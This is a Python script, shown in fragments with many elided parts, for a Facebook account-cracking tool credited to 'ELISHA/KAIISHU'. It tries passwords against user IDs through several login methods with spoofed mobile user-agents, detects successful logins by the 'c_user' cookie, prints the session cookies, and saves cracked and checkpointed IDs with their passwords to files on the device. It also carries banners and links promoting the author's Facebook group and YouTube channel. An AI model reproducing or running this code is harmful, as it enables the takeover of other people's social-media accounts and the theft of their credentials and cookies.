# fb id https://www.facebook.com/profile.php?id=100073610516677
...
os.system("clear")
print("\033[1;32mJOIN MY \033[1;31mFACEBOOK \033[1;32mGROUP")
os.system("xdg-open https://www.facebook.com/groups/1390274245235155/?ref=share/")
#app  check 
...
\033[1;37m ####### ####### ###  #####  #     # #     # 
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[1;32m        [ SABKA  ◈✙◈ \33[1;33mMOLA ◈✙◈\33[1;37m ALLAH  ]          ║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[1;33m(•)●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;35m๑۩♡۩๑\033[0;95m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●💔
\033[1;36m[•] ━▷ \033[1;31mCREATED BY   ◈✙◈  \033[1;31mOWNER ELIISHA
\033[1;32m[•] ━▷ \033[1;36mFACEBOK      ◈✙◈  \033[1;36mURF-KAIISHU
\033[1;37m[•] ━▷ \033[1;37mJACKWAR       ◈✙◈  \033[1;37mVAIBHAV
\033[1;33m[•] ━▷ \033[1;32mSTATUS       ◈✙◈  \033[1;32mTOOL IS FREE
\033[1;35m[•] ━▷ \033[1;35mYT CHANEL ◈✙◈  \033[1;35m🥰KAIISHU-98🥰
\033[1;32m[•] ━▷ \033[1;33mMASJID E   ◈✙◈  \033[1;33mAQSA LIFE
\033[1;37m[•] ━▷ \033[1;32mWHATSAPP.    ◈✙◈  \033[1;37UUSE NHI KARTI HU 
\033[1;37m(•)●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;35m๑۩♡۩๑\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●💔\n\n"""  
loop = 0
oks = []
cps = []
os.system('espeak -a 300 " Welcome,   to,  ELISHA,  KAIISHU,  Tools"')
...
def xerx():
    ...
    elif aryan =='7':os.system("xdg-open https://www.facebook.com/profile.php?id=100073610516677")
    else:
...
def xerx2():
	...
	print('[?] Ids saved in ELISHA-OK.txt,KAIISHU-CP.txt')
	print(47*"-")
...
def xerx4():
	...
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ELISHA-OK.txt,ELISHA-CP.txt')
	print(47*"-")
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				uid = coki[151:166]
				print('\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
				print('\33[1;92m[ELISHA-OK🍁🪶] '+uid+' | '+ps+'|'+Joined(uid)+'\r\033[1;35m')
				if 'y' in xerx_xd:
					...
					break
				open('/sdcard/ELISHA-OK.txt', 'a').write(uid+' | '+ps+'\n')
				oks.append(cid)
				break
				...
				uid = coki[151:166]
				if 'y' in baby:
					print('\33[1;91m[ELISHA-CP] '+uid+' | '+ps+'\33[0;97m')
					open('/sdcard/ELISHA-CP.txt', 'a').write(uid+' | '+ps+'\n')
					cps.append(uid)
					break
				else:
					open('/sdcard/ELISHA-CP.txt', 'a').write(uid+' | '+ps+'\n')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M1-ELISHA🍁🪶] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				if 'y' in baby:
					...
					open('/sdcard/ELISHA-CP.txt', 'a').write(cid+' | '+ps+'\n')
					break
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M2-ELISHA🍁🪶] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def x(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M3-ELISHA🍁🪶] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def mobile(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				uid = coki[151:166]
				print('\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
				print('\33[1;92m[ELISHA-OK🍁🪶]\033[1;32m'+uid+' | '+ps+'|'+Joined(uid)+'\r\033[1;35m')
				if 'y' in xerx_xd:
					print(f"\033[1;33m[COOKIES 🌺]: \033[1;32m{coki}")
					print('\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
					cek_apk(session,coki)
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M4-ELISHA🍁🪶] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def freeq(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				uid = coki[151:166]
				if 'y' in baby:
					print('\33[1;91m[ELISHA-CP] '+cid+' | '+ps+'\33[0;97m')
					open('/sdcard/ELISHA-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M5-ELISHA🍁🪶] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def d(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M6-ELISHA🍁🪶] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
